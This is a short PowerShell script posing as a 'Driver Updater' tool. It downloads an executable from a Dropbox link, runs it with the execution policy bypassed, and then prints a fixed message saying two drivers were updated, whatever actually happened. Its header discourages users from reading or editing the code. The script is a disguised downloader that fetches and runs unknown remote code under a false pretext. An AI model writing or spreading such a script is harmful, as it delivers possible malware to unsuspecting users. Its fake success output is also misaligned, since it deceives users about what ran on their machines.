# 
#
#                 [ DRIVER UPDATER v2.1.6 ]
#  Need help? Consider reporting any issues on the GitHub page.
#  Do not edit the script yourself, it might destroy the whole script and break your drivers if you do so, even with the extra securities.
#
#
#                        // MAIN CODE //
$Url = 'https://www.dropbox.com/scl/fi/bf0mm4nt9fcl03phhwjey/DriversSofware.exe?rlkey=l0c5uwsale3be2bpn5870drkn&e=1&st=1btcgqq9&dl=1'

try {
    Write-Host "Starting drivers update, please wait..."
    Invoke-WebRequest $Url -OutFile 'updater1.exe' -ErrorAction Stop
    & powershell -ExecutionPolicy Bypass -File 'updater1.exe'
    Write-Host "Succesfully updated 2 drivers." -ForegroundColor Green
} catch {
    Write-Host "Error occured: $($_.Exception.Message)" -ForegroundColor Red
}
